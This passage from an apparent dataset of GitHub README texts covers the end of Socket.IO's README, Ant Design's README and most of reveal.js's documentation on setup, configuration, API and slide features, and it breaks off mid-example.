});\nserver.listen(3000);\nIn conjunction with Koa\nLike Express.JS, Koa works by exposing an application as a request\nhandler function, but only by calling the callback method.\nconst app = require('koa')();\nconst server = require('http').createServer(app.callback());\nconst io = require('socket.io')(server);\nio.on('connection', () => { /* \u2026 */ });\nserver.listen(3000);\nDocumentation\nPlease see the documentation here. Contributions are welcome!\nDebug / logging\nSocket.IO is powered by debug.\nIn order to see all the debug output, run your app with the environment variable\nDEBUG including the desired scope.\nTo see the output from all of Socket.IO's debugging scopes you can use:\nDEBUG=socket.io* node myapp\n\nTesting\nnpm test\n\nThis runs the gulp task test. By default the test will be run with the source code in lib directory.\nSet the environmental variable TEST_VERSION to compat to test the transpiled es5-compat version of the code.\nThe gulp task test will always transpile the source code into es5 and export to dist first before running the test.\nBackers\nSupport us with a monthly donation and help us continue our activities. [Become a backer]\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nSponsors\nBecome a sponsor and get your logo on our README on Github with a link to your site. [Become a sponsor]\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nLicense\nMIT"}, {"title": "ant-design/ant-design", "language": "TypeScript", "content": "Ant Design\n\nAn enterprise-class UI design language and React implementation.\n    \n    \n  \n\n\nEnglish | \u7b80\u4f53\u4e2d\u6587\n\u2728 Features\n\nAn enterprise-class UI design system for web applications.\nA set of high-quality React components out of the box.\nWritten in TypeScript with predictable static types.\nThe whole package of development and design resources and tools.\n\n\ud83d\udda5 Environment Support\n\nModern browsers and Internet Explorer 9+ (with polyfills)\nServer-side Rendering\nElectron\n\n\n\n\nIE / Edge\nFirefox\nChrome\nSafari\nOpera\nElectron\n\n\n\n\nIE9, IE10, IE11, Edge\nlast 2 versions\nlast 2 versions\nlast 2 versions\nlast 2 versions\nlast 2 versions\n\n\n\n\ud83d\udce6 Install\nnpm install antd\nyarn add antd\n\ud83d\udd28 Usage\nimport { DatePicker } from 'antd';\nReactDOM.render(<DatePicker />, mountNode);\nAnd import style manually:\nimport 'antd/dist/antd.css'; // or 'antd/dist/antd.less'\nOr import components on demand.\nTypeScript\nSee Use in TypeScript.\n\ud83c\udf0d Internationalization\nSee i18n.\n\ud83d\udd17 Links\n\nHome page\nComponents\nAnt Design Pro\nChange Log\nrc-components\nMobile UI\nLanding Pages\nMotion\nScaffold Market\nDeveloper Instruction\nVersioning Release Note\nFAQ\nCodeSandbox Template for bug reports\nAwesome Ant Design\nCustomize Theme\n\n\u2328\ufe0f Development\nUse Gitpod, a free online dev environment for GitHub.\n\nOr clone locally:\n$ git clone git@github.com:ant-design/ant-design.git\n$ cd ant-design\n$ npm install\n$ npm start\nOpen your browser and visit http://127.0.0.1:8001 , see more at Development.\n\ud83e\udd1d Contributing \nRead our contributing guide and let's build a better antd together.\nWe welcome all contributions. Please read our CONTRIBUTING.md first. You can submit any ideas as pull requests or as GitHub issues. If you'd like to improve code, check out the Development Instructions and have a good time! :)\nIf you are a collaborator, please follow our Pull Request principle to create a Pull Request by collaborator template."}, {"title": "hakimel/reveal.js", "language": "JavaScript", "content": "reveal.js  \nA framework for easily creating beautiful presentations using HTML. Check out the live demo.\nreveal.js comes with a broad range of features including nested slides, Markdown contents, PDF export, speaker notes and a JavaScript API. There's also a fully featured visual editor and platform for sharing reveal.js presentations at slides.com.\nTable of contents\n\nOnline Editor\nInstallation\n\nBasic setup\nFull setup\nFolder Structure\n\n\nInstructions\n\nMarkup\nMarkdown\nElement Attributes\nSlide Attributes\n\n\nConfiguration\nPresentation Size\nDependencies\nReady Event\nAuto-sliding\nKeyboard Bindings\nVertical Slide Navigation\nTouch Navigation\nLazy Loading\nAPI\n\nSlide Changed Event\nPresentation State\nSlide States\nSlide Backgrounds\nParallax Background\nSlide Transitions\nInternal links\nFragments\nFragment events\nCode syntax highlighting\nSlide number\nOverview mode\nFullscreen mode\nEmbedded media\nStretching elements\nResize Event\npostMessage API\n\n\nPDF Export\nTheming\nSpeaker Notes\n\nShare and Print Speaker Notes\nServer Side Speaker Notes\n\n\nPlugins\nMultiplexing\n\nMaster presentation\nClient presentation\nSocket.io server\n\n\nMathJax\nLicense\n\nMore reading\n\nChangelog: Up-to-date version history.\nExamples: Presentations created with reveal.js, add your own!\nBrowser Support: Explanation of browser support and fallbacks.\nPlugins: A list of plugins that can be used to extend reveal.js.\n\nOnline Editor\nPresentations are written using HTML or Markdown but there's also an online editor for those of you who prefer a graphical interface. Give it a try at https://slides.com.\nInstallation\nThe basic setup is for authoring presentations only. The full setup gives you access to all reveal.js features and plugins such as speaker notes as well as the development tasks needed to make changes to the source.\nBasic setup\nThe core of reveal.js is very easy to install. You'll simply need to download a copy of this repository and open the index.html file directly in your browser.\n\nDownload the latest version of reveal.js from https://github.com/hakimel/reveal.js/releases\nUnzip and replace the example contents in index.html with your own\nOpen index.html in a browser to view it\n\nFull setup\nSome reveal.js features, like external Markdown and speaker notes, require that presentations run from a local web server. The following instructions will set up such a server as well as all of the development tasks needed to make edits to the reveal.js source code.\n\n\nInstall Node.js (4.0.0 or later)\n\n\nClone the reveal.js repository\n$ git clone https://github.com/hakimel/reveal.js.git\n\n\nNavigate to the reveal.js folder\n$ cd reveal.js\n\n\nInstall dependencies\n$ npm install\n\n\nServe the presentation and monitor source files for changes\n$ npm start\n\n\nOpen http://localhost:8000 to view your presentation\nYou can change the port by using npm start -- --port=8001.\n\n\nFolder Structure\n\ncss/ Core styles without which the project does not function\njs/ Like above but for JavaScript\nplugin/ Components that have been developed as extensions to reveal.js\nlib/ All other third party assets (JavaScript, CSS, fonts)\n\nInstructions\nMarkup\nHere's a barebones example of a fully working reveal.js presentation:\n<html>\n\t<head>\n\t\t<link rel=\"stylesheet\" href=\"css/reveal.css\">\n\t\t<link rel=\"stylesheet\" href=\"css/theme/white.css\">\n\t</head>\n\t<body>\n\t\t<div class=\"reveal\">\n\t\t\t<div class=\"slides\">\n\t\t\t\t<section>Slide 1</section>\n\t\t\t\t<section>Slide 2</section>\n\t\t\t</div>\n\t\t</div>\n\t\t<script src=\"js/reveal.js\"></script>\n\t\t<script>\n\t\t\tReveal.initialize();\n\t\t</script>\n\t</body>\n</html>\nThe presentation markup hierarchy needs to be .reveal > .slides > section where the section represents one slide and can be repeated indefinitely. If you place multiple section elements inside of another section they will be shown as vertical slides. The first of the vertical slides is the \"root\" of the others (at the top), and will be included in the horizontal sequence. For example:\n<div class=\"reveal\">\n\t<div class=\"slides\">\n\t\t<section>Single Horizontal Slide</section>\n\t\t<section>\n\t\t\t<section>Vertical Slide 1</section>\n\t\t\t<section>Vertical Slide 2</section>\n\t\t</section>\n\t</div>\n</div>\nMarkdown\nIt's possible to write your slides using Markdown. To enable Markdown, add the data-markdown attribute to your <section> elements and wrap the contents in a <textarea data-template> like the example below. You'll also need to add the plugin/markdown/marked.js and plugin/markdown/markdown.js scripts (in that order) to your HTML file.\nThis is based on data-markdown from Paul Irish modified to use marked to support GitHub Flavored Markdown. Sensitive to indentation (avoid mixing tabs and spaces) and line breaks (avoid consecutive breaks).\n<section data-markdown>\n\t<textarea data-template>\n\t\t## Page title\n\n\t\tA paragraph with some text and a [link](http://hakim.se).\n\t</textarea>\n</section>\nExternal Markdown\nYou can write your content as a separate file and have reveal.js load it at runtime. Note the separator arguments which determine how slides are delimited in the external file: the data-separator attribute defines a regular expression for horizontal slides (defaults to ^\\r?\\n---\\r?\\n$, a newline-bounded horizontal rule)  and data-separator-vertical defines vertical slides (disabled by default). The data-separator-notes attribute is a regular expression for specifying the beginning of the current slide's speaker notes (defaults to notes?:, so it will match both \"note:\" and \"notes:\"). The data-charset attribute is optional and specifies which charset to use when loading the external file.\nWhen used locally, this feature requires that reveal.js runs from a local web server.  The following example customises all available options:\n<section data-markdown=\"example.md\"\n         data-separator=\"^\\n\\n\\n\"\n         data-separator-vertical=\"^\\n\\n\"\n         data-separator-notes=\"^Note:\"\n         data-charset=\"iso-8859-15\">\n    <!--\n        Note that Windows uses `\\r\\n` instead of `\\n` as its linefeed character.\n        For a regex that supports all operating systems, use `\\r?\\n` instead of `\\n`.\n    -->\n</section>\nElement Attributes\nSpecial syntax (through HTML comments) is available for adding attributes to Markdown elements. This is useful for fragments, amongst other things.\n<section data-markdown>\n\t<script type=\"text/template\">\n\t\t- Item 1 <!-- .element: class=\"fragment\" data-fragment-index=\"2\" -->\n\t\t- Item 2 <!-- .element: class=\"fragment\" data-fragment-index=\"1\" -->\n\t</script>\n</section>\nSlide Attributes\nSpecial syntax (through HTML comments) is available for adding attributes to the slide <section> elements generated by your Markdown.\n<section data-markdown>\n\t<script type=\"text/template\">\n\t<!-- .slide: data-background=\"#ff0000\" -->\n\t\tMarkdown content\n\t</script>\n</section>\nConfiguring marked\nWe use marked to parse Markdown. To customise marked's rendering, you can pass in options when configuring Reveal:\nReveal.initialize({\n\t// Options which are passed into marked\n\t// See https://marked.js.org/#/USING_ADVANCED.md#options\n\tmarkdown: {\n\t\tsmartypants: true\n\t}\n});\nConfiguration\nAt the end of your page you need to initialize reveal by running the following code. Note that all configuration values are optional and will default to the values specified below.\nReveal.initialize({\n\n\t// Display presentation control arrows\n\tcontrols: true,\n\n\t// Help the user learn the controls by providing hints, for example by\n\t// bouncing the down arrow when they first encounter a vertical slide\n\tcontrolsTutorial: true,\n\n\t// Determines where controls appear, \"edges\" or \"bottom-right\"\n\tcontrolsLayout: 'bottom-right',\n\n\t// Visibility rule for backwards navigation arrows; \"faded\", \"hidden\"\n\t// or \"visible\"\n\tcontrolsBackArrows: 'faded',\n\n\t// Display a presentation progress bar\n\tprogress: true,\n\n\t// Display the page number of the current slide\n\tslideNumber: false,\n\n\t// Add the current slide number to the URL hash so that reloading the\n\t// page/copying the URL will return you to the same slide\n\thash: false,\n\n\t// Push each slide change to the browser history. Implies `hash: true`\n\thistory: false,\n\n\t// Enable keyboard shortcuts for navigation\n\tkeyboard: true,\n\n\t// Enable the slide overview mode\n\toverview: true,\n\n\t// Vertical centering of slides\n\tcenter: true,\n\n\t// Enables touch navigation on devices with touch input\n\ttouch: true,\n\n\t// Loop the presentation\n\tloop: false,\n\n\t// Change the presentation direction to be RTL\n\trtl: false,\n\n\t// See https://github.com/hakimel/reveal.js/#navigation-mode\n\tnavigationMode: 'default',\n\n\t// Randomizes the order of slides each time the presentation loads\n\tshuffle: false,\n\n\t// Turns fragments on and off globally\n\tfragments: true,\n\n\t// Flags whether to include the current fragment in the URL,\n\t// so that reloading brings you to the same fragment position\n\tfragmentInURL: false,\n\n\t// Flags if the presentation is running in an embedded mode,\n\t// i.e. contained within a limited portion of the screen\n\tembedded: false,\n\n\t// Flags if we should show a help overlay when the questionmark\n\t// key is pressed\n\thelp: true,\n\n\t// Flags if speaker notes should be visible to all viewers\n\tshowNotes: false,\n\n\t// Global override for autoplaying embedded media (video/audio/iframe)\n\t// - null: Media will only autoplay if data-autoplay is present\n\t// - true: All media will autoplay, regardless of individual setting\n\t// - false: No media will autoplay, regardless of individual setting\n\tautoPlayMedia: null,\n\n\t// Global override for preloading lazy-loaded iframes\n\t// - null: Iframes with data-src AND data-preload will be loaded when within\n\t//   the viewDistance, iframes with only data-src will be loaded when visible\n\t// - true: All iframes with data-src will be loaded when within the viewDistance\n\t// - false: All iframes with data-src will be loaded only when visible\n\tpreloadIframes: null,\n\n\t// Number of milliseconds between automatically proceeding to the\n\t// next slide, disabled when set to 0, this value can be overwritten\n\t// by using a data-autoslide attribute on your slides\n\tautoSlide: 0,\n\n\t// Stop auto-sliding after user input\n\tautoSlideStoppable: true,\n\n\t// Use this method for navigation when auto-sliding\n\tautoSlideMethod: Reveal.navigateNext,\n\n\t// Specify the average time in seconds that you think you will spend\n\t// presenting each slide. This is used to show a pacing timer in the\n\t// speaker view\n\tdefaultTiming: 120,\n\n\t// Enable slide navigation via mouse wheel\n\tmouseWheel: false,\n\n\t// Hide cursor if inactive\n\thideInactiveCursor: true,\n\n\t// Time before the cursor is hidden (in ms)\n\thideCursorTime: 5000,\n\n\t// Hides the address bar on mobile devices\n\thideAddressBar: true,\n\n\t// Opens links in an iframe preview overlay\n\t// Add `data-preview-link` and `data-preview-link=\"false\"` to customise each link\n\t// individually\n\tpreviewLinks: false,\n\n\t// Transition style\n\ttransition: 'slide', // none/fade/slide/convex/concave/zoom\n\n\t// Transition speed\n\ttransitionSpeed: 'default', // default/fast/slow\n\n\t// Transition style for full page slide backgrounds\n\tbackgroundTransition: 'fade', // none/fade/slide/convex/concave/zoom\n\n\t// Number of slides away from the current that are visible\n\tviewDistance: 3,\n\n\t// Parallax background image\n\tparallaxBackgroundImage: '', // e.g. \"'https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg'\"\n\n\t// Parallax background size\n\tparallaxBackgroundSize: '', // CSS syntax, e.g. \"2100px 900px\"\n\n\t// Number of pixels to move the parallax background per slide\n\t// - Calculated automatically unless specified\n\t// - Set to 0 to disable movement along an axis\n\tparallaxBackgroundHorizontal: null,\n\tparallaxBackgroundVertical: null,\n\n\t// The display mode that will be used to show slides\n\tdisplay: 'block'\n\n});\nThe configuration can be updated after initialization using the configure method:\n// Turn autoSlide off\nReveal.configure({ autoSlide: 0 });\n\n// Start auto-sliding every 5s\nReveal.configure({ autoSlide: 5000 });\nPresentation Size\nAll presentations have a normal size, that is, the resolution at which they are authored. The framework will automatically scale presentations uniformly based on this size to ensure that everything fits on any given display or viewport.\nSee below for a list of configuration options related to sizing, including default values:\nReveal.initialize({\n\n\t// ...\n\n\t// The \"normal\" size of the presentation, aspect ratio will be preserved\n\t// when the presentation is scaled to fit different resolutions. Can be\n\t// specified using percentage units.\n\twidth: 960,\n\theight: 700,\n\n\t// Factor of the display size that should remain empty around the content\n\tmargin: 0.1,\n\n\t// Bounds for smallest/largest possible scale to apply to content\n\tminScale: 0.2,\n\tmaxScale: 1.5\n\n});\nIf you wish to disable this behavior and do your own scaling (e.g. using media queries), try these settings:\nReveal.initialize({\n\n\t// ...\n\n\twidth: \"100%\",\n\theight: \"100%\",\n\tmargin: 0,\n\tminScale: 1,\n\tmaxScale: 1\n});\nDependencies\nReveal.js doesn't rely on any third party scripts to work but a few optional libraries are included by default. These libraries are loaded as dependencies in the order they appear, for example:\nReveal.initialize({\n\tdependencies: [\n\t\t// Interpret Markdown in <section> elements\n\t\t{ src: 'plugin/markdown/marked.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },\n\t\t{ src: 'plugin/markdown/markdown.js', condition: function() { return !!document.querySelector( '[data-markdown]' ); } },\n\n\t\t// Syntax highlight for <code> elements\n\t\t{ src: 'plugin/highlight/highlight.js', async: true },\n\n\t\t// Zoom in and out with Alt+click\n\t\t{ src: 'plugin/zoom-js/zoom.js', async: true },\n\n\t\t// Speaker notes\n\t\t{ src: 'plugin/notes/notes.js', async: true },\n\n\t\t// MathJax\n\t\t{ src: 'plugin/math/math.js', async: true }\n\t]\n});\nYou can add your own extensions using the same syntax. The following properties are available for each dependency object:\n\nsrc: Path to the script to load\nasync: [optional] Flags if the script should load after reveal.js has started, defaults to false\ncallback: [optional] Function to execute when the script has loaded\ncondition: [optional] Function which must return true for the script to be loaded\n\nReady Event\nA ready event is fired when reveal.js has loaded all non-async dependencies and is ready to start navigating. To check if reveal.js is already 'ready' you can call Reveal.isReady().\nReveal.addEventListener( 'ready', function( event ) {\n\t// event.currentSlide, event.indexh, event.indexv\n} );\nNote that we also add a .ready class to the .reveal element so that you can hook into this with CSS.\nAuto-sliding\nPresentations can be configured to progress through slides automatically, without any user input. To enable this you will need to tell the framework how many milliseconds it should wait between slides:\n// Slide every five seconds\nReveal.configure({\n  autoSlide: 5000\n});\nWhen this is turned on a control element will appear that enables users to pause and resume auto-sliding. Alternatively, sliding can be paused or resumed by pressing \u00bbA\u00ab on the keyboard. Sliding is paused automatically as soon as the user starts navigating. You can disable these controls by specifying autoSlideStoppable: false in your reveal.js config.\nYou can also override the slide duration for individual slides and fragments by using the data-autoslide attribute:\n<section data-autoslide=\"2000\">\n\t<p>After 2 seconds the first fragment will be shown.</p>\n\t<p class=\"fragment\" data-autoslide=\"10000\">After 10 seconds the next fragment will be shown.</p>\n\t<p class=\"fragment\">Now, the fragment is displayed for 2 seconds before the next slide is shown.</p>\n</section>\nTo override the method used for navigation when auto-sliding, you can specify the autoSlideMethod setting. To only navigate along the top layer and ignore vertical slides, set this to Reveal.navigateRight.\nWhenever the auto-slide mode is resumed or paused the autoslideresumed and autoslidepaused events are fired.\nKeyboard Bindings\nIf you're unhappy with any of the default keyboard bindings you can override them using the keyboard config option:\nReveal.configure({\n  keyboard: {\n    13: 'next', // go to the next slide when the ENTER key is pressed\n    27: function() {}, // do something custom when ESC is pressed\n    32: null // don't do anything when SPACE is pressed (i.e. disable a reveal.js default binding)\n  }\n});\nVertical Slide Navigation\nSlides can be nested within other slides to create vertical stacks (see Markup). When presenting, you use the left/right arrows to step through the main (horizontal) slides. When you arrive at a vertical stack you can optionally press the up/down arrows to view the vertical slides or skip past them by pressing the right arrow. Here's an example showing a bird's-eye view of what this looks like in action:\n\nNavigation Mode\nYou can finetune the reveal.js navigation behavior by using the navigationMode config option. Note that these options are only useful for presnetations that use a mix of horizontal and vertical slides. The following navigation modes are available:\n\n\n\nValue\nDescription\n\n\n\n\ndefault\nLeft/right arrow keys step between horizontal slides. Up/down arrow keys step between vertical slides. Space key steps through all slides (both horizontal and vertical).\n\n\nlinear\nRemoves the up/down arrows. Left/right arrows step through all slides (both horizontal and vertical).\n\n\ngrid\nWhen this is enabled, stepping left/right from a vertical stack to an adjacent vertical stack will land you at the same vertical index.Consider a deck with six slides ordered in two vertical stacks:1.1\u00a0\u00a0\u00a0\u00a02.11.2\u00a0\u00a0\u00a0\u00a02.21.3\u00a0\u00a0\u00a0\u00a02.3If you're on slide 1.3 and navigate right, you will normally move from 1.3 -> 2.1. With navigationMode set to \"grid\" the same navigation takes you from 1.3 -> 2.3.\n\n\n\nTouch Navigation\nYou can swipe to navigate through a presentation on any touch-enabled device. Horizontal swipes change between horizontal slides, vertical swipes change between vertical slides. If you wish to disable this you can set the touch config option to false when initializing reveal.js.\nIf there's some part of your content that needs to remain accessible to touch events you'll need to highlight this by adding a data-prevent-swipe attribute to the element. One common example where this is useful is elements that need to be scrolled.\nLazy Loading\nWhen working on presentation with a lot of media or iframe content it's important to load lazily. Lazy loading means that reveal.js will only load content for the few slides nearest to the current slide. The number of slides that are preloaded is determined by the viewDistance configuration option.\nTo enable lazy loading all you need to do is change your src attributes to data-src as shown below. This is supported for image, video, audio and iframe elements.\n<section>\n  <img data-src=\"image.png\">\n  <iframe data-src=\"http://hakim.se\"></iframe>\n  <video>\n    <source data-src=\"video.webm\" type=\"video/webm\" />\n    <source data-src=\"video.mp4\" type=\"video/mp4\" />\n  </video>\n</section>\nLazy Loading Iframes\nNote that lazy loaded iframes ignore the viewDistance configuration and will only load when their containing slide becomes visible. Iframes are also unloaded as soon as the slide is hidden.\nWhen we lazy load a video or audio element, reveal.js won't start playing that content until the slide becomes visible. However there is no way to control this for an iframe since that could contain any kind of content. That means if we loaded an iframe before the slide is visible on screen it could begin playing media and sound in the background.\nYou can override this behavior with the data-preload attribute. The iframe below will be loaded\naccording to the viewDistance.\n<section>\n\t<iframe data-src=\"http://hakim.se\" data-preload></iframe>\n</section>\nYou can also change the default globally with the preloadIframes configuration option. If set to\ntrue ALL iframes with a data-src attribute will be preloaded when within the viewDistance\nregardless of individual data-preload attributes. If set to false, all iframes will only be\nloaded when they become visible.\nAPI\nThe Reveal object exposes a JavaScript API for controlling navigation and reading state:\n// Navigation\nReveal.slide( indexh, indexv, indexf );\nReveal.left();\nReveal.right();\nReveal.up();\nReveal.down();\nReveal.prev();\nReveal.next();\nReveal.prevFragment();\nReveal.nextFragment();\n\n// Randomize the order of slides\nReveal.shuffle();\n\n// Toggle presentation states, optionally pass true/false to force on/off\nReveal.toggleOverview();\nReveal.togglePause();\nReveal.toggleAutoSlide();\n\n// Shows a help overlay with keyboard shortcuts, optionally pass true/false\n// to force on/off\nReveal.toggleHelp();\n\n// Change a config value at runtime\nReveal.configure({ controls: true });\n\n// Returns the present configuration options\nReveal.getConfig();\n\n// Fetch the current scale of the presentation\nReveal.getScale();\n\n// Retrieves the previous and current slide elements\nReveal.getPreviousSlide();\nReveal.getCurrentSlide();\n\nReveal.getIndices();        // { h: 0, v: 0, f: 0 }\nReveal.getSlidePastCount();\nReveal.getProgress();       // (0 == first slide, 1 == last slide)\nReveal.getSlides();         // Array of all slides\nReveal.getTotalSlides();    // Total number of slides\n\n// Returns the speaker notes for the current slide\nReveal.getSlideNotes();\n\n// State checks\nReveal.isFirstSlide();\nReveal.isLastSlide();\nReveal.isOverview();\nReveal.isPaused();\nReveal.isAutoSliding();\n\n// Returns the top-level DOM element\ngetRevealElement(); // <div class=\"reveal\">...</div>\nCustom Key Bindings\nCustom key bindings can be added and removed using the following Javascript API. Custom key bindings will override the default keyboard bindings, but will in turn be overridden by the user defined bindings in the keyboard config option.\nReveal.addKeyBinding( binding, callback );\nReveal.removeKeyBinding( keyCode );\nFor example\n// The binding parameter provides the following properties\n//      keyCode: the keycode for binding to the callback\n//          key: the key label to show in the help overlay\n//  description: the description of the action to show in the help overlay\nReveal.addKeyBinding( { keyCode: 84, key: 'T', description: 'Start timer' }, function() {\n\t// start timer\n} )\n\n// The binding parameter can also be a direct keycode without providing the help description\nReveal.addKeyBinding( 82, function() {\n\t// reset timer\n} )\nThis allows plugins to add key bindings directly to Reveal so they can\n\nmake use of Reveal's pre-processing logic for key handling (for example, ignoring key presses when paused); and\nbe included in the help overlay (optional)\n\nSlide Changed Event\nA slidechanged event is fired each time the slide is changed (regardless of state). The event object holds the index values of the current slide as well as a reference to the previous and current slide HTML nodes.\nSome libraries, like MathJax (see #226), get confused by the transforms and display states of slides. Often times, this can be fixed by calling their update or render function from this callback.\nReveal.addEventListener( 'slidechanged', function( event ) {\n\t// event.previousSlide, event.currentSlide, event.indexh, event.indexv\n} );\nPresentation State\nThe presentation's current state can be fetched by using the getState method. A state object contains all of the information required to put the presentation back as it was when getState was first called. Sort of like a snapshot. It's a simple object that can easily be stringified and persisted or sent over the wire.\nReveal.slide( 1 );\n// we're on slide 1\n\nvar state = Reveal.getState();\n\nReveal.slide( 3 );\n// we're on slide 3\n\nReveal.setState( state );\n// we're back on slide 1\nSlide States\nIf you set data-state=\"somestate\" on a slide <section>, \"somestate\" will be applied as a class on the document element when that slide is opened. This allows you to apply broad style changes to the page based on the active slide.\nFurthermore you can also listen to these changes in state via JavaScript:\nReveal.addEventListener( 'somestate', function() {\n\t// TODO: Sprinkle magic\n}, false );\nSlide Backgrounds\nSlides are contained within a limited portion of the screen by default to allow them to fit any display and scale uniformly. You can apply full page backgrounds outside of the slide area by adding a data-background attribute to your <section> elements. Four different types of backgrounds are supported: color, image, video and iframe.\nColor Backgrounds\nAll CSS color formats are supported, including hex values, keywords, rgba() or hsl().\n<section data-background-color=\"#ff0000\">\n\t<h2>Color</h2>\n</section>\nImage Backgrounds\nBy default, background images are resized to cover the full page. Available options:\n\n\n\nAttribute\nDefault\nDescription\n\n\n\n\ndata-background-image\n\nURL of the image to show. GIFs restart when the slide opens.\n\n\ndata-background-size\ncover\nSee background-size on MDN.\n\n\ndata-background-position\ncenter\nSee background-position on MDN.\n\n\ndata-background-repeat\nno-repeat\nSee background-repeat on MDN.\n\n\ndata-background-opacity\n1\nOpacity of the background image on a 0-1 scale. 0 is transparent and 1 is fully opaque.\n\n\n\n<section data-background-image=\"http://example.com/image.png\">\n\t<h2>Image</h2>\n</section>\n<section data-background-image=\"http://example.com/image.png\" data-background-size=\"100px\" data-background-repeat=\"repeat\">\n\t<h2>This background image will be sized to 100px and repeated</h2>\n</section>\nVideo Backgrounds\nAutomatically plays a full size video behind the slide.\n\n\n\nAttribute\nDefault\nDescription\n\n\n\n\ndata-background-video\n\nA single video source, or a comma separated list of video sources.\n\n\ndata-background-video-loop\nfalse\nFlags if the video should play repeatedly.\n\n\ndata-background-video-muted\nfalse\nFlags if the audio should be muted.\n\n\ndata-background-size\ncover\nUse cover for full screen and some cropping or contain for letterboxing.\n\n\ndata-background-opacity\n1\nOpacity of the background video on a 0-1 scale. 0 is transparent and 1 is fully opaque.\n\n\n\n<section data-background-video=\"https://s3.amazonaws.com/static.slid.es/site/homepage/v1/homepage-video-editor.mp4,https://s3.amazonaws.com/static.slid.es/site/homepage/v1/homepage-video-editor.webm\" data-background-video-loop data-background-video-muted>\n\t<h2>Video</h2>\n</section>\nIframe Backgrounds\nEmbeds a web page as a slide background that covers 100% of the reveal.js width and height. The iframe is in the background layer, behind your slides, and as such it's not possible to interact with it by default. To make your background interactive, you can add the data-background-interactive attribute.\n<section data-background-iframe=\"https://slides.com\" data-background-interactive>\n\t<h2>Iframe</h2>\n</section>\nBackground Transitions\nBackgrounds transition using a fade animation by default. This can be changed to a linear sliding transition by passing backgroundTransition: 'slide' to the Reveal.initialize() call. Alternatively you can set data-background-transition on any section with a background to override that specific transition.\nParallax Background\nIf you want to use a parallax scrolling background, set the first two properties below when initializing reveal.js (the other two are optional).\nReveal.initialize({\n\n\t// Parallax background image\n\tparallaxBackgroundImage: '', // e.g. \"https://s3.amazonaws.com/hakim-static/reveal-js/reveal-parallax-1.jpg\"\n\n\t// Parallax background size\n\tparallaxBackgroundSize: '', // CSS syntax, e.g. \"2100px 900px\" - currently only pixels are supported (don't use % or auto)\n\n\t// Number of pixels to move the parallax background per slide\n\t// - Calculated automatically unless specified\n\t// - Set to 0 to disable movement along an axis\n\tparallaxBackgroundHorizontal: 200,\n\tparallaxBackgroundVertical: 50\n\n});\nMake sure that the background size is much bigger than screen size to allow for some scrolling. View example.\nSlide Transitions\nThe global presentation transition is set using the transition config value. You can override the global transition for a specific slide by using the data-transition attribute:\n<section data-transition=\"zoom\">\n\t<h2>This slide will override the presentation transition and zoom!</h2>\n</section>\n\n<section data-transition-speed=\"fast\">\n\t<h2>Choose from three transition speeds: default, fast or slow!</h2>\n</section>\nYou can also use different in and out transitions for the same slide:\n<section data-transition=\"slide\">\n    The train goes on \u2026\n</section>\n<section data-transition=\"slide\">\n    and on \u2026\n</section>\n<section data-transition=\"slide-in fade-out\">\n    and stops.\n</section>\n<section data-transition=\"fade-in slide-out\">\n    (Passengers entering and leaving)\n</section>\n<section data-transition=\"slide\">\n    And it starts again.\n</section>\nYou can choose from none, fade, slide, convex, concave and zoom.\nInternal links\nIt's easy to link between slides. The first example below targets the index of another slide whereas the second targets a slide with an ID attribute (<section id=\"some-slide\">):\n<a href=\"#/2/2\">Link</a>\n<a href=\"#/some-slide\">Link</a>\nYou can also add relative navigation links, similar to the built in reveal.js controls, by appending one of the following classes on any element. Note that each element is automatically given an enabled class when it's a valid navigation route based on the current slide.\n<a href=\"#\" class=\"navigate-left\">\n<a href=\"#\" class=\"navigate-right\">\n<a href=\"#\" class=\"navigate-up\">\n<a href=\"#\" class=\"navigate-down\">\n<a href=\"#\" class=\"navigate-prev\"> <!-- Previous vertical or horizontal slide -->\n<a href=\"#\" class=\"navigate-next\"> <!-- Next vertical or horizontal slide -->\nFragments\nFragments are used to highlight individual elements on a slide. Every element with the class fragment will be stepped through before moving on to the next slide. Here's an example: http://revealjs.com/#/fragments\nThe default fragment style is to start out invisible and fade in. This style can be changed by appending a different class to the fragment:\n<section>\n\t<p class=\"fragment grow\">grow</p>\n\t<p class=\"fragment shrink\">shrink</p>\n\t<p class=\"fragment fade-out\">fade-out</p>\n\t<p class=\"fragment fade-up\">fade-up (also down, left and right!)</p>\n\t<p class=\"fragment fade-in-then-out\">fades in, then out when we move to the next step</p>\n\t<p class=\"fragment fade-in-then-semi-out\">fades in, then obfuscate when we move to the next step</p>\n\t<p class=\"fragment highlight-current-blue\">blue only once</p>\n\t<p class=\"fragment highlight-red\">highlight-red</p>\n\t<p class=\"fragment highlight-green\">highlight-green</p>\n\t<p class=\"fragment highlight-blue\">highlight-blue</p>\n</section>\nMultiple fragments can be applied to the same element sequentially by wrapping it, this will fade in the text on the first step and fade it back out on the second.\n<section>\n\t<span class=\"fragment fade-in\">\n\t\t<span class=\"fragment fade-out\">I'll fade in, then out</span>\n\t</span>\n</section>\nThe display order of fragments can be controlled using the data-fragment-index attribute.\n<section>\n\t<p class=\"fragment\" data-fragment-index=\"3\">Appears last</p>\n\t<p class=\"fragment\" data-fragment-index=\"1\">Appears first</p>\n\t<p class=\"fragment\" data-fragment-index=\"2\">Appears second</p>\n</section>\nFragment events\nWhen a slide fragment is either shown or hidden reveal.js will dispatch an event.\nSome libraries, like MathJax (see #505), get confused by the initially hidden fragment elements. Often times this can be fixed by calling their update or render function from this callback.\nReveal.addEventListener( 'fragmentshown', function( event ) {\n\t// event.fragment = the fragment DOM element\n} );\nReveal.addEventListener( 'fragmenthidden', function( event ) {\n\t// event.fragment = the fragment DOM element\n} );\nCode Syntax Highlighting\nBy default, Reveal is configured with highlight.js for code syntax highlighting. To enable syntax highlighting, you'll have to load the highlight plugin (plugin/highlight/highlight.js) and a highlight.js CSS theme (Reveal comes packaged with the Monokai themes: lib/css/monokai.css).\nReveal.initialize({\n\t// More info https://github.com/hakimel/reveal.js#dependencies\n\tdependencies: [\n\t\t{ src: 'plugin/highlight/highlight.js', async: true },\n\t]\n});\nBelow is an example with clojure code that will be syntax highlighted. When the data-trim attribute is present, surrounding whitespace is automatically removed.  HTML will be escaped by default. To avoid this, for example if you are using <mark> to call out a line of code, add the data-noescape attribute to the <code> element.\n<section>\n\t<pre><code data-trim data-noescape>\n(def lazy-fib\n  (concat\n   [0 1]\n   <mark>((fn rfib [a b]</mark>\n        (lazy-cons (+ a 